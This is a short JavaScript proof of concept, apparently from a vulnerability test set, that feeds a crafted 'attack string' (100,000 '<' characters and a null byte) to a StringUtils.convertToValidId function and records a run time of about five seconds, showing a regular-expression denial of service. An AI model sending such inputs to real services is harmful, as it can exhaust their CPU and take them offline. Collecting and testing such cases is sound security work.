import StringUtils from "./stringUtils.js";

//Attack String :""+"<"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<";
}
str += "\u0000";

console.log(StringUtils.convertToValidId(str));

// real    0m5.217s
// user    0m5.199s
// sys     0m0.000s